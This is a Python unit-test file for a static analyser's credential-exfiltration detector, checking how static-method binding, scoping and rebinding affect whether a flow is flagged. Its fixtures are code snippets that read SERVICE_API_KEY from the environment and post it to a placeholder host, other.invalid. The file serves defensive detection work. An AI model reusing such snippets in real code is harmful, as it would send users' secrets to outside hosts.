"""Class-qualified static calls use call-time globals and definition-time defaults."""

import unittest
from test_qindun_certify import MODULE


class PythonStaticMethodBindingTests(unittest.TestCase):
    def test_unsupported_static_dispatch_reports_incomplete(self):
        cases = [
            "class Sender(Base):\n    @staticmethod\n    def send():\n        pass\n",
            "@decorate\nclass Sender:\n    @staticmethod\n    def send():\n        pass\n",
            "staticmethod=decorate\nclass Sender:\n    @staticmethod\n    def send():\n        pass\n",
            "class Sender:\n    @staticmethod\n    @decorate\n    def send():\n        pass\n",
            "class Sender:\n    @staticmethod\n    async def send():\n        pass\n",
            "class Sender:\n    @staticmethod\n    def send():\n        pass\n"
            "def change():\n    Sender.send=print\nchange()\n",
        ]
        for source in cases:
            with self.subTest(source=source):
                _, error = MODULE._python_flow_findings("main.py", source)
                self.assertIsNotNone(error)

    def test_rebinding_and_calls_from_other_scopes(self):
        prefix = 'import os,requests\nkey=os.getenv("SERVICE_API_KEY")\n'
        method = (
            "class Sender:\n    @staticmethod\n    def send():\n"
            '        requests.post("https://other.invalid",data=key)\n'
        )
        cases = [
            (method + "Sender.send=print\nSender.send()\n", False),
            (method + "Sender.send: object=print\nSender.send()\n", False),
            (method + "del Sender.send\nSender.send()\n", False),
            (method + "    send=print\nSender.send()\n", False),
            (method + "Alias=Sender\nAlias.send=print\nSender.send()\n", False),
            (method + "saved=Sender.send\nSender.send=print\nsaved()\n", True),
            (method + 'def caller():\n    key="public"\n    Sender.send()\ncaller()\n', True),
            (
                'key="public"\n'
                + method
                + 'def caller():\n    key=os.getenv("SERVICE_API_KEY")\n    Sender.send()\ncaller()\n',
                False,
            ),
            (
                'key="public"\ndef send():\n    requests.post("https://other.invalid",data=key)\n'
                'class Other:\n    key=os.getenv("SERVICE_API_KEY")\n    send()\n',
                False,
            ),
            (
                "class Sender:\n    @staticmethod\n    def read():\n        return key\n"
                'requests.post("https://other.invalid",data=Sender.read())\n',
                True,
            ),
            (method + 'Sender.send()\nkey="public"\nSender.send()\n', True),
        ]
        for source, expected in cases:
            with self.subTest(source=source):
                hits, _ = MODULE._python_flow_findings("main.py", prefix + source)
                self.assertEqual(
                    any(
                        h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                        and h.disposition == "confirmed"
                        for h in hits
                    ),
                    expected,
                )

    def test_static_method_scope_and_binding(self):
        prefix = "import os,requests\n"
        secret = 'os.getenv("SERVICE_API_KEY")'
        method = 'class Sender:\n    @staticmethod\n    def send():\n        requests.post("https://other.invalid",data=key)\n'
        cases = [
            (method + "key=" + secret + "\nSender.send()\n", True),
            ("key=" + secret + "\n" + method + 'key="public"\nSender.send()\n', False),
            (
                'key="public"\nclass Sender:\n    key='
                + secret
                + '\n    @staticmethod\n    def send():\n        requests.post("https://other.invalid",data=key)\nSender.send()\n',
                False,
            ),
            (
                "key="
                + secret
                + '\nclass Sender:\n    key="public"\n    @staticmethod\n    def send():\n        requests.post("https://other.invalid",data=key)\nSender.send()\n',
                True,
            ),
            (
                "class Sender:\n    key="
                + secret
                + '\n    @staticmethod\n    def send(value=key):\n        requests.post("https://other.invalid",data=value)\nSender.send()\n',
                True,
            ),
            (
                "class Sender:\n    key="
                + secret
                + '\n    @staticmethod\n    def send(value=key):\n        requests.post("https://other.invalid",data=value)\nSender.send("public")\n',
                False,
            ),
            (method + "key=" + secret + "\nAlias=Sender\nAlias.send()\n", True),
            (method + "key=" + secret + '\nSender="public"\nSender.send()\n', False),
            (method + "key=" + secret + '\nAlias=Sender\nSender="public"\nAlias.send()\n', True),
            (
                method
                + "key="
                + secret
                + '\ndef caller(Sender):\n    Sender.send()\ncaller("public")\n',
                False,
            ),
            (method + "key=" + secret + "\n", False),
            (
                'class Sender:\n    @staticmethod\n    def send(key):\n        requests.post("https://other.invalid",data=key)\nSender.send('
                + secret
                + ")\n",
                True,
            ),
        ]
        for source, expected in cases:
            with self.subTest(source=source):
                hits, error = MODULE._python_flow_findings("main.py", prefix + source)
                self.assertIsNone(error)
                self.assertEqual(
                    any(
                        h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                        and h.disposition == "confirmed"
                        for h in hits
                    ),
                    expected,
                )

    def test_class_namespace_does_not_rebind_module(self):
        source = (
            'import os,requests\nkey="public"\nclass Sender:\n'
            '    key=os.getenv("SERVICE_API_KEY")\n'
            'requests.post("https://other.invalid",data=key)\n'
        )
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        self.assertFalse(any(h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION" for h in hits))

    def test_static_auth_retains_separate_payload(self):
        source = (
            "import os,requests\nclass Sender:\n    @staticmethod\n"
            "    def send(key):\n"
            '        requests.get("https://service.invalid",headers={"X-API-Key":key})\n'
            '        requests.post("https://other.invalid",data=key)\n'
            'Sender.send(os.getenv("SERVICE_API_KEY"))\n'
        )
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        self.assertEqual(
            {h.disposition for h in hits if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"},
            {"candidate", "confirmed"},
        )
